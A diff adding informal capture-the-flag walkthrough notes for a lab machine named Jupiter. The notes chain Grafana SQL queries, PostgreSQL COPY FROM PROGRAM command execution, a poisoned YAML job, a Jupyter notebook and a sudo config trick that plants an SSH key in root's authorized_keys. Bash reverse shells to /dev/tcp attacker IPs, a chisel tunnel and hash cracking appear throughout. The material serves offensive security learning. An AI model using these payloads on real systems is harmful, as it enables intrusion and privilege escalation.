@@ -1,0 +1,151 @@
+No Extra ports were detected during all port scan
+
+http://kiosk.jupiter.htb/ -> grafana instance
+
+Gafana v9.5.2 -> CVE-2023-2801 ?
+
+META Data from a GET /api/dashboards/uid/jMgFGfA4z : Intercepted
+"meta":{"type":"db","canSave":false,"canEdit":false,"canAdmin":false,"canStar":false,"canDelete":false,"slug":"moons","url":"/d/jMgFGfA4z/moons","expires":"0001-01-01T00:00:00Z","created":"2023-03-07T11:24:34Z","updated":"2023-03-07T11:38:14Z","updatedBy":"admin","createdBy":"admin","version":2,"hasAcl":false,"isFolder":false,"folderId":0,"folderUid":"","folderTitle":"General","folderUrl":"","provisioned":false,"provisionedExternalId":"","annotationsPermissions":{"dashboard":{"canAdd":true,"canEdit":true,"canDelete":true},"organization":{"canAdd":false,"canEdit":false,"canDelete":false}}
+
+admin: -> grafana
+
+After some burp interceptions and refreshes, we can find in the
+http history on burp, there are post reqs to /api/ds/query
+using postgres sql we can enumerate tables and data
+
+google says pg_authid can store creds
+
+SCRAM-SHA-256$4096:K9IJE4h9f9+tr7u7AZL76w==$qdrtC1sThWDZGwnPwNctrEbEwc8rFpLWYFVTeLOy3ss=:oD4gG69X8qrSG4bXtQ62M83OkjeFDOYrypE3tUv0JOY=
+
+hashcat -m 28600 postgres.hash /usr/share/wordlists/rockyou.txt
+postgres.hash not crackable
+
+CVE-2019-9193 -> gets us a shell as postgres on the box!
+
+https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/authenticated-arbitrary-command-execution-on-postgresql-9-3/
+
+COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.34/4444 0>&1\"'
+-------------------------------------------------------------------
+
+echo -n "COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/10.10.14.36/4444 0>&1\"';" -> COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.36/4444 0>&1"';
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Using pspy64 there is a user on the box performing commands automatically
+referencing a yml file inside /dev/shm
+
+==================================================
+
+2023/06/24 02:46:01 CMD: UID=1000  PID=23896  | /bin/bash /home/juno/shadow-simulation.sh 
+2023/06/24 02:46:01 CMD: UID=1000  PID=23897  | 
+2023/06/24 02:46:01 CMD: UID=1000  PID=23898  | /home/juno/.local/bin/shadow /dev/shm/network-simulation.yml 
+2023/06/24 02:46:01 CMD: UID=1000  PID=23901  | sh -c lscpu --online --parse=CPU,CORE,SOCKET,NODE 
+2023/06/24 02:46:01 CMD: UID=1000  PID=23902  | lscpu --online --parse=CPU,CORE,SOCKET,NODE 
+2023/06/24 02:46:01 CMD: UID=1000  PID=23907  | /usr/bin/python3 -m http.server 80 
+2023/06/24 02:46:01 CMD: UID=1000  PID=23908  | /usr/bin/curl -s server 
+2023/06/24 02:46:01 CMD: UID=1000  PID=23910  | /usr/bin/curl -s server 
+2023/06/24 02:46:01 CMD: UID=1000  PID=23912  | /usr/bin/curl -s server 
+2023/06/24 02:46:02 CMD: UID=1000  PID=23917  | cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/
+
+==================================================
+
+we can poison the yml file with our own code that will then be executed
+
+once we wget our bad yml file we have to chmod 777 *.yml so the user can access it
+
+chmod 777 mal.yml
+cp mal.yml network-simulation.yml
+ls /tmp | grep -i myBash
+
+After committing a small terrorist attack on the box
+the yml file code exec was working once mal.yml was change to just mal
+
+bash -i >& /dev/tcp/10.10.14.36/4445 0>&1
+
+chmod 777 -> allow RWX to all users
+chmod 600 sshKeyFile -> needed to use ssh -i on keyFile
+
+ssh-keygen -> enter passcode -> place SSH_Key.pub into authorized_keys -> ssh -i keyFile user@ip -> logged in!
+
+--------------------------------------------------------------------
+
+port 8888 is running something called jupyter?
+
+juno@jupiter:~$ jupyter --version
+Selected Jupyter core packages...
+IPython          : 8.11.0
+ipykernel        : 6.21.3
+ipywidgets       : 8.0.4
+jupyter_client   : 8.0.3
+jupyter_core     : 5.2.0
+jupyter_server   : 2.4.0
+jupyterlab       : not installed
+nbclient         : not installed
+nbconvert        : 7.2.9
+nbformat         : not installed
+notebook         : 6.5.3
+qtconsole        : 5.4.0
+traitlets        : 5.9.0
+
+netstat -nptl -> see all listening ports on the machine
+
+jupyter --paths -> config locations
+
+./chisel client 10.10.14.52:4444 R:3000:127.0.0.1:3000 R:8888:127.0.0.1:8888 R:5432:127.0.0.1:5432 &
+
+Going into /opt/solar-flares/logs -> finding the most recent log we can find a URL that lets us on the
+localhost:8888
+
+Looking through that we can use the flares.ipynb to exec python code as Jovian, simple reverse shell and were good!
+
+sudo -l shows a script that can ran as root
+
+find / -type f 2>/dev/null | grep -i "sattrack" -> shows some stuff
+
+/usr/local/share/sattrack/
+
+cat /usr/local/share/sattrack/config.json
+
+strings /usr/local/bin/sattrack | grep -i conf -> tells us possible dirs its lookin for conf files in
+
+cp conf.json /tmp/config.json
+sudo /usr/local/bin/sattrack
+
+conf.json:
+
+{
+  "tleroot":"/root/.ssh/", --> directory to write files to
+  "tlefile":"authorized_keys", -> new file name
+  "mapfile":"/usr/local/share/sattrack/earth.png",
+  "texturefile":"/usr/local/share/sattrack/map.json",
+
+  "tlesources":[
+          "http://10.10.14.52:80/authorized_keys" -> downloads this file and outputs it as the new file name
+  ],
+
+  "updatePerdiod":1000,
+
+  "station": {
+        "name":"LORCA",
+        "lat": 37.5211,
+        "lon": -1.5910,
+        "hgt": 335.05
+  },
+
+  "show": [
+
+  ],
+
+  "columns":[
+        "name",
+        "azel",
+        "dis",
+        "geo",
+        "tab",
+        "pos",
+        "vel"
+  ]
+}
+
+For root we plug this .json file into the machine and run the sudo command as prompted, it will go through without any error, what should happen is we get a hit from the target downloading out key.pub and places it inside of
+/root/.ssh/authorized_keys, this then allows us to chmod 600 the private key and ssh -i as root and pwn the machine!
